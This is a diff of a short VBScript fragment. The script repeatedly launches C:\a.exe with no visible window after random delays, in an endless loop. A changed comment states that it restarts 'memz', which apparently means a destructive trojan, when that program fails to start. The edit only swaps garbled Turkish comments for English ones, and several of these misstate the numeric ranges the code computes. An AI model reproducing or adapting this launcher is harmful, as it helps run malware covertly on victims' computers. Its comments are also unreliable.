@@ -11,11 +11,11 @@ Set objShell = CreateObject("WScript.Shell")
 Do
 If colItems.Count > 0 Then
     Randomize
-    timeout = Int((269 - 69 + 1) * Rnd + 30)  ' 31-169 aras� random bi�e
-    WScript.Sleep timeout * 1000  ' Saniyeyi Saniyeci�e
-    objShell.Run "C:\a.exe", 0, False  ' C:\a.exe pencereciksiz �al��t�rayo
+    timeout = Int((269 - 69 + 1) * Rnd + 30)  ' between 269-69 it selects random number
+    WScript.Sleep timeout * 1000  ' transforms that number to seconds
+    objShell.Run "C:\a.exe", 0, False  ' It runs a.exe without a window
 End If
 Randomize
-sleep_time = Int((2 - 1 + 1) * Rnd + 30)  ' Yeniden a�mak i�in mola
-WScript.Sleep sleep_time * 1000  ' Saniyeden Saniyecikci�e
+sleep_time = Int((2 - 1 + 1) * Rnd + 30)  ' if memz fails it'll restart it because %95 of time it runs on second start
+WScript.Sleep sleep_time * 1000  ' same as before x1000 
 Loop
